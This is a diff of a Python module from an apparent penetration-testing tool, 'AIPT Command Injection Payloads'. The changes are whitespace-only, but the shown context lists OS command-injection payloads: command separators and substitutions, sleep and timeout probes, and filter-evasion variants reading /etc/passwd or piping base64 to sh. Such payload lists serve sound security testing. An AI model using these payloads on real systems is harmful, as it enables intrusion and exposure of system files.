@@ -3,6 +3,7 @@ AIPT Command Injection Payloads
 
 OS command injection payloads for security testing.
 """
+
 from __future__ import annotations
 
 from typing import Iterator
@@ -39,15 +40,12 @@ class CommandInjectionPayloads:
                 f"&& {cmd}",
                 f"`{cmd}`",
                 f"$({cmd})",
-
                 # Newline
                 f"\n{cmd}",
                 f"\r\n{cmd}",
-
                 # With quotes
                 f"'; {cmd}; '",
                 f'"; {cmd}; "',
-
                 # Null byte
                 f"%00{cmd}",
             ]
@@ -80,7 +78,6 @@ class CommandInjectionPayloads:
             "`sleep 5`",
             "$(sleep 5)",
             "'; sleep 5; '",
-
             # Windows timeout
             "& timeout 5",
             "& ping -n 5 127.0.0.1",
@@ -110,31 +107,24 @@ class CommandInjectionPayloads:
             "/b?n/c?t /etc/passwd",
             "/b??/cat /etc/passwd",
             "/???/c?t /etc/passwd",
-
             # Using environment variables
             "$HOME",
             "${HOME}",
-
             # Hex encoding
             "$'\\x69\\x64'",  # id
-
             # Using quotes
             "i'd'",
             'i"d"',
             "wh''oami",
             'wh""oami',
-
             # Using backslash
             "wh\\oami",
             "c\\at /etc/passwd",
-
             # Using $@
             "wh$@oami",
             "c$@at /etc/passwd",
-
             # Base64
             "echo aWQ= | base64 -d | sh",
-
             # Variable concatenation
             "a=who;b=ami;$a$b",
             "a=c;b=at;$a$b /etc/passwd",
